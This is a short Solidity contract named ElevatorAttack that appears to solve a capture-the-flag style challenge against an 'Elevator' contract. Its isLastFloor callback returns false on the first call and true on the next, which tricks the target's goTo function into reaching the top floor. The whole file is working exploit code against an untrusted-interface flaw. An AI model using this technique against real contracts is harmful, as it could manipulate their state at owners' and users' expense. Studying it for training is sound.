// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { Elevator } from "./Elevator.sol";


contract ElevatorAttack{
    Elevator victim;
    uint256 howmanytimeswasicalled = 0;
    constructor(address _v){
        victim = Elevator(_v);
        
    }

    function go() public {
        victim.goTo(5);
    }
    function isLastFloor(uint256 _floor) external returns(bool){
        
        if(howmanytimeswasicalled == 0){
            howmanytimeswasicalled++;
            return false;
        }
        else {
            return true;
        }
    }
}